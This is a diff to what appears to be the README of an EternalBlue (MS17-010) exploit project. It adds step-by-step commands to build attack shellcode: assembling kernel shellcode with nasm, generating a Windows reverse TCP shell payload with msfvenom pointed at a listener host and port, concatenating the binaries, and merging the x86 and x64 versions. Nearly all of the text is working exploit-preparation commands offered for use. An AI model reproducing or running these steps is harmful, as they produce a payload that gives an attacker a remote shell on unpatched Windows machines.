@@ -115,12 +115,26 @@ Windows 10 Pro Build 10240 x64
 ```
 
 ## Generate Shellcode (Manually):
+
+Assemble kernel shellcode with nasm:
 ```
+nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+```
+Generate a binary payload with venom:
+```
+msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.1.123 --platform windows -a x86 -f raw -o sc_x86_payload.bin
+Saved as: sc_x86_payload.bin
+```
+Concentrate it:
+```
+cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
 ```
 
-## Merging binaries:
+
+
+## Merging binaries(x86 and x86_64):
 ```
-python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+python shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
 ```
 
 
